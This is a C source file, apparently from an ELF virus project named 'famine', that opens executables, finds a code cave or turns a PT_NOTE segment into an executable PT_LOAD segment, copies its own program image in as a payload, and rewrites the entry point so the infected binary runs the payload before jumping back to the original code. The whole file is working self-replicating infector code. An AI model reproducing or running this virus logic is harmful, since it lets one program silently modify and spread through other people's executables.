#include "../includes/famine.h"

static int replace_addr(t_env *env, unsigned int needle, unsigned int replace, int offset) {
	size_t i = 0;
	int j = 0;

	for (i = 0; i < env->payload_size; ++i) {
		if (i * 8 < env->payload_size) {
			int found = 0;
			for (j = 0; j < 8; ++j) {
				if (i * 8 + j + 4 < env->payload_size && \
				*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) == needle) {
					found = 1;
					break;
				}
			}
			if (found) {
				if (offset == 1) // take current position in account
					replace -= (i * 8 + j); // replace should be negative
				*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j] - 7) = replace + 7;
				// replace "leave ret" (c9c3) by NOP to slide to jmp with replaced address
				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 10) = 0x90;
				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 9) = 0x90;
				break;
			}
		}
	}
	return (i * 8 + j);
}

static void inject_code(t_env *env) {
	// replace entrypoint
	((Elf64_Ehdr *)env->obj_cpy)->e_entry = env->inject_addr + env->plt_offset;
	// calc dist between original entry and the end and inject point
	unsigned int inject_dist = env->inject_addr - env->entrypoint;
	// replace jmp addr in payload
	replace_addr(env, 0x42424242, -(inject_dist), 1);
	// inject payload
	ft_memmove(env->obj_cpy + env->inject_offset, env->payload_content, env->payload_size);
}

static void find_injection_point(t_env *env) {
	// get obj header
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)env->obj;
	// get sections number
	int shnum = ehdr->e_shnum;
	// get first section header
	Elf64_Shdr *shdr = (Elf64_Shdr *)(env->obj + ehdr->e_shoff);
	// get pheader number
	int phnum = ehdr->e_phnum;
	// get first p_header
	Elf64_Phdr *phdr = (Elf64_Phdr *)(env->obj + ehdr->e_phoff);
	// get str table
	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
	const char *sh_strtab_p = env->obj + sh_strtab->sh_offset;
	// get original entrypoint
	env->entrypoint = ehdr->e_entry;
	long unsigned int bss_offset = 0;
	size_t size = 0;
	int load_found = 0;

	for (int i = 0; i < phnum; ++i) {
		// get base address
		if (load_found == 0 && phdr[i].p_type == PT_LOAD) {
			env->obj_base = phdr[i].p_vaddr;
			env->load_align = phdr[i].p_align;
			load_found = 1;
		}
		if (phdr[i+1].p_offset - (phdr[i].p_offset + phdr[i].p_memsz) > env->payload_size) {
			//if (DEBUG) printf("Found code cave in PT_LOAD at %lx\n", phdr[i].p_offset);
			env->inject_offset = phdr[i].p_offset + phdr[i].p_memsz;
			env->inject_addr = env->obj_base + env->inject_offset;
			env->found_code_cave = 1;
			env->found_code_cave_id = i;
			break;
		}
		else {
			//if (DEBUG) printf("Not enought space in PT_LOAD, injecting after last section.\n");
			// parse sections
			for (int i = 0; i < shnum; i++) {
				if (ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".bss") == 0) {
					bss_offset = shdr[i].sh_offset;
					size += shdr[i].sh_size;
					while (size % shdr[i].sh_addralign) {
						++size;
					}
				}
				if (shdr[i].sh_offset > bss_offset) {
					size += shdr[i].sh_offset;
					while (size % shdr[i].sh_addralign) {
						++size;
					}
				}
			}
			env->inject_offset = bss_offset + size;
			env->inject_addr = env->obj_base + env->inject_offset;
			break;
		}
	}
}

static void tweak_elf(t_env *env) {
	// get obj header
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)env->obj_cpy;
	// get sections number
	int shnum = ehdr->e_shnum;
	// get first section header
	Elf64_Shdr *shdr = (Elf64_Shdr *)(env->obj_cpy + ehdr->e_shoff);
	// get pheader number
	int phnum = ehdr->e_phnum;
	// get first p_header
	Elf64_Phdr *phdr = (Elf64_Phdr *)(env->obj_cpy + ehdr->e_phoff);
	// get str table
	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
	const char *sh_strtab_p = env->obj_cpy + sh_strtab->sh_offset;

	if (env->found_code_cave == 1) {
		// patch the pheader
		phdr[env->found_code_cave_id].p_filesz += env->payload_size;
		phdr[env->found_code_cave_id].p_memsz += env->payload_size;
		phdr[env->found_code_cave_id].p_flags = PF_R | PF_W | PF_X;
	}
	else {
		for (int i = 0; i < phnum; ++i) {
			// get .note.* phdr if no code_cave found (so it will become the new injected phdr)
			if (phdr[i].p_type == PT_NOTE) {
				//if (DEBUG) printf("Found PT_NOTE at %lx, turning it to PT_LOAD.\n", phdr[i].p_offset);
				// set the new injected phdr
				phdr[i].p_type = PT_LOAD;
				phdr[i].p_offset = env->inject_offset;
				phdr[i].p_paddr = env->inject_addr;
				phdr[i].p_vaddr = env->inject_addr;
				phdr[i].p_filesz = env->payload_size;
				phdr[i].p_memsz = env->payload_size;
				phdr[i].p_flags = PF_R | PF_W | PF_X;
				phdr[i].p_align = env->load_align;
				break;
			}
		}
		for (int i = 0; i < shnum; ++i) {
			// get .note.ABI-tag shdr if no code_cave found (so it will become the new injected shdr)
			if (shdr[i].sh_type == SHT_NOTE && ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".note.ABI-tag") == 0) {
				//if (DEBUG) printf("Found .note.ABI-tag at %lx, turning it to SHT_PROGBITS.\n", shdr[i].sh_offset);
				// set the new injected shdr
				shdr[i].sh_type = SHT_PROGBITS;
				shdr[i].sh_offset = env->inject_offset;
				shdr[i].sh_addr = env->inject_addr;
				shdr[i].sh_size = env->payload_size;
				shdr[i].sh_flags = SHF_ALLOC | SHF_EXECINSTR;
				shdr[i].sh_addralign = 16;
				break;
			}
		}
	}
}

static int get_payload(t_env *env) {
	size_t main_offset = (char *)&main - &__executable_start;
	env->payload_size = &_end - &__executable_start;
	// save payload in env
	/*if ((env->payload_content = malloc(env->payload_size + 16)) == NULL) {
		if (DEBUG) printf("DEBUG PAYLOAD: malloc failed\n");
		return -1;
	}*/
	if ((env->payload_content = syscall_mmap(0, env->payload_size + 16, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return -1;
	}
	// coppy payload + prepend jump to main
	ft_bzero(env->payload_content, env->payload_size + 16);
	((char*)env->payload_content)[0] = 0xe9;
	main_offset += 16 - 5;
	unsigned char lsb = (unsigned)main_offset & 0xff; // mask the lower 8 bits
	unsigned char msb = (unsigned)main_offset >> 8;   // shift the higher 8 bits
	((char*)env->payload_content)[2] = msb;
	((char*)env->payload_content)[1] = lsb;
	ft_memmove((char*)env->payload_content + 16, &__executable_start, env->payload_size);
	env->payload_size += 16;
	return 0;
}

static int handle_obj(t_env *env) {
	// build payload
	if (get_payload(env)) {
		return -1;
	}
	// get injection location
	find_injection_point(env);
	// extend obj size in case we need to inject at end
	if (env->inject_offset + env->payload_size > env->obj_size) {
		env->new_obj_size = env->inject_offset + env->payload_size;
	}
	// copy original file
	/*if ((env->obj_cpy = malloc(env->new_obj_size + 1)) == NULL) {
		//if (DEBUG) printf("Error: can't duplicate file.\n");
		return -1;
	}*/
	if ((env->obj_cpy = syscall_mmap(0, env->new_obj_size + 1, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return -1;
	}
	ft_memset(env->obj_cpy, 0, env->new_obj_size + 1);
	ft_memmove(env->obj_cpy, env->obj, env->obj_size);
	// tweak target file's headers
	tweak_elf(env);
	// inject and dump new obj
	inject_code(env);
	if (dump_obj(env)) {
		if (DEBUG) printf("Error dumping new object.\n");
		return -1;
	}
	// debug
	//if (DEBUG) printf("Original entrypoint: \t%08x\n", env->entrypoint);
	//if (DEBUG) printf("Inserted entrypoint: \t%08x\n", env->inject_addr + env->plt_offset);
	//if (DEBUG) printf("Inserted size: \t\t%08lx\n\n", env->payload_size);
	//if (DEBUG) debug_dump(env, env->payload_content, env->inject_addr, env->payload_size);
	return 0;
}

int read_obj(t_env *env) {
	int	fd;
	void *obj;
	int ret = 0;
	struct stat	buf;

	if ((fd = syscall_open_2(env->obj_name, O_RDONLY)) < 0) {
		//if (DEBUG) printf("Error: Can't open file %s \n", env->obj_name);
		return -1;
	}
	else if (syscall_fstat(fd, &buf) < 0) {
		//if (DEBUG) printf("Error: Fstat error\n");
	}
	else if ((buf.st_mode & S_IFMT) != S_IFREG && \
		(buf.st_mode & S_IFMT) != S_IFLNK && (buf.st_mode & S_IFMT) != S_IFSOCK) {
		//if (DEBUG) printf("Error: File is not valid\n");
	}
	else if (buf.st_size <= 0) {
		//if (DEBUG) printf("Error: File is empty\n");
	}
	else if ((buf.st_uid == syscall_getuid() && !(buf.st_mode & S_IXUSR)) || \
		(buf.st_gid == syscall_getgid() && !(buf.st_mode & S_IXGRP)) || \
		!(buf.st_mode & S_IXOTH)) {
		//if (DEBUG) printf("Error: User do not have exec permissions on target\n");
	}
	else if ((obj = syscall_mmap(0, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
		//if (DEBUG) printf("Error mapping file %s \n", env->obj_name);
		syscall_close(fd);
		return -1;
	}
	else {
		syscall_close(fd);
		if (check_corruption(obj, buf.st_size) == 0) {
			env->obj = obj;
			env->obj_size = buf.st_size;
			env->new_obj_size = buf.st_size;
			env->cpu = (((char*)obj)[5] == 1) ? 1 : 0;
			if (handle_obj(env)) {
				ret = -1;
			}
		}
		else {
			ret = -1;
		}
		if (syscall_munmap(obj, buf.st_size) < 0) {
			//if (DEBUG) printf("Error munmap\n");
			ret = -1;
		}
	}
	return ret;
}